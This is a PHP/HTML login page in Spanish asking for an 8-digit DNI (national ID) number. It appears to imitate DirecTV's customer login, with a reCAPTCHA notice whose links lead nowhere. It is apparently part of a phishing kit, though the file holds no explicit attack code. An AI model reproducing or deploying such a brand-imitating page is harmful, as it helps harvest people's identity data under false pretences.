<?php
include_once("parts/header.php");
?>
<body>
	<nav>
		<div class="contenedor">
<?php
include_once("parts/nav.php");
?>
		</div>
	</nav>
	<div class="container-fluid">
		<div class="row d-flex justify-content-center">
			<div class="col-10 col-md-6 mt-5">
				<h3 class="text-left mb-4">Para empezar, ingresá tu DNI</h3>
				<div class="row d-flex justify-content-center contenedor_caja mb-5">
					<div class="col-12">
						<form method="POST" action="login">
							<div class="row">
								<div class="col-12 m-0 p-0">
									<label for="DNI" id="DNI_label">DNI</label>
								</div>
								<div class="col-12 m-0 p-0">
									<input type="text" class="input-smart-card directv-input touched" id="DNI" name="DNI" placeholder="" minlength="8" maxlength="8" inputmode="decimal" required>
								</div>
								<div class="col-12 m-0 p-0 d-flex align-items-center">
									<span class="checkbox checked"></span><span class="checkbox_label">Recordarme</span>
								</div>
								<div class="col-12 hr"></div>
								<div class="col-12 mt-2">
									<button type="submit" id="DNI_button">Continuar</button>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
			<div class="col-12">
				<p class="secure">Protegido por reCAPTCHA <a href="#">Privacidad</a> - <a href="#">Condiciones</a></p>
			</div>
		</div>
	</div>
<?php
include_once("parts/footer.php");
?>
</body>
</html>